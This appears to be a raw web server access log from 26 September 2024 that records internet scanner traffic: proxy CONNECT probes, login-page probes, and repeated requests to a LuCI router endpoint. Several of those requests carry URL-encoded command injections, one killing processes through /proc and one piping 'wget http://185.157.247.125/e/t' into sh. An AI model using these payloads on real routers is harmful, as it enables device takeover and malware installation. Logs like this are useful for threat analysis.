87.120.166.244 - - [26/Sep/2024:13:32:19 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
78.108.177.54 - - [26/Sep/2024:13:56:50 +0330] "GET / HTTP/1.0" 200 6041
85.105.116.226 - - [26/Sep/2024:14:20:32 +0330] "GET / HTTP/1.0" 200 6039
95.214.55.43 - - [26/Sep/2024:14:40:36 +0330] "GET /webpages/login.html HTTP/1.1" 404 790
45.148.10.242 - - [26/Sep/2024:14:49:52 +0330] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 805
154.213.184.25 - - [26/Sep/2024:14:59:06 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
154.213.184.18 - - [26/Sep/2024:15:21:58 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
95.214.27.169 - - [26/Sep/2024:15:32:31 +0330] "GET / HTTP/1.1" 200 6040
95.214.27.169 - - [26/Sep/2024:15:32:31 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
95.214.27.169 - - [26/Sep/2024:15:32:31 +0330] "GET / HTTP/1.1" 200 6041
95.214.27.169 - - [26/Sep/2024:15:32:31 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
154.213.184.25 - - [26/Sep/2024:16:23:30 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
87.120.166.244 - - [26/Sep/2024:16:30:10 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
159.89.237.190 - - [26/Sep/2024:16:49:07 +0330] "GET / HTTP/1.1" 200 6039
185.224.128.83 - - [26/Sep/2024:17:10:26 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 805
185.224.128.83 - - [26/Sep/2024:17:10:26 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 805
179.43.133.162 - - [26/Sep/2024:17:35:59 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
65.49.1.60 - - [26/Sep/2024:17:39:41 +0330] "-" 400 2917
154.213.184.25 - - [26/Sep/2024:18:24:19 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
185.224.128.59 - - [26/Sep/2024:18:33:49 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 805
185.224.128.59 - - [26/Sep/2024:18:33:49 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 805
154.213.184.18 - - [26/Sep/2024:19:28:18 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
95.214.55.43 - - [26/Sep/2024:20:00:51 +0330] "GET /webpages/login.html HTTP/1.1" 404 790
92.154.28.58 - - [26/Sep/2024:20:45:02 +0330] "GET / HTTP/1.0" 200 6040
154.213.184.25 - - [26/Sep/2024:20:50:46 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
185.224.128.83 - - [26/Sep/2024:20:55:59 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 805
185.224.128.83 - - [26/Sep/2024:20:55:59 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 805
179.43.133.162 - - [26/Sep/2024:21:11:12 +0330] "CONNECT cloudflare.com:443 HTTP/1.1" 400 811
87.120.166.244 - - [26/Sep/2024:21:56:18 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
172.169.2.251 - - [26/Sep/2024:22:19:08 +0330] "GET /manager/text/list HTTP/1.1" 403 3529
154.213.184.18 - - [26/Sep/2024:23:04:02 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
51.255.109.166 - - [26/Sep/2024:23:18:58 +0330] "GET / HTTP/1.1" 200 6039
154.213.184.25 - - [26/Sep/2024:23:43:52 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
45.148.10.242 - - [26/Sep/2024:23:44:12 +0330] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 805
185.224.128.59 - - [26/Sep/2024:23:55:51 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 805
185.224.128.59 - - [26/Sep/2024:23:55:51 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 805
